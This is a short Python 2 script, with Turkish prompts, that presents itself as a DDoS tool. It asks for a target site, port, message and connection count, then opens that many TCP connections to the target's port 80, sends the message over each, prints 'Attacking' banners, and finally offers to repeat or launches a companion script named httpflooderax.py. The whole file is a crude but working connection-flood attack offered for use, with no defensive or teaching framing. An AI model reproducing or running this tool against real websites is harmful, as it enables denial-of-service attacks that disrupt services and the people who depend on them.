import time
import socket
import os
import sys
import string


# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

def restart_program():
    python = sys.executable
    os.execl(python, python, *sys.argv)


curdir = os.getcwd()

# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#

print ("DDoS Mod")
host = raw_input("HEDEF SITE :")
port = input("PORT :")
message = raw_input("MESAJINIZ :")
conn = input("Kac Baglanti yapmak istiyorsun :")
ip = socket.gethostbyname(host)
print ("[" + ip + "]")
print ("[Ip is locked]")
print ("[Attacking " + host + "]")
print ("+----------------------------+")


def dos():
    # pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send(message)
        ddos.sendto(message, (ip, port))
        ddos.send(message)
    except socket.error, msg:
        print("|[Baglanti Hatasi]         |")
    print ("|[DDoS Saldirisi]       |")
    ddos.close()


for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("The connections you requested had finished")
if __name__ == "__main__":
    answer = raw_input("Daha fazla ddos atmak istermisiniz :")
    if answer.strip() in "y Y evet Yes YES".split():
        restart_program()
    else:
        os.system(curdir + "httpflooderax.py")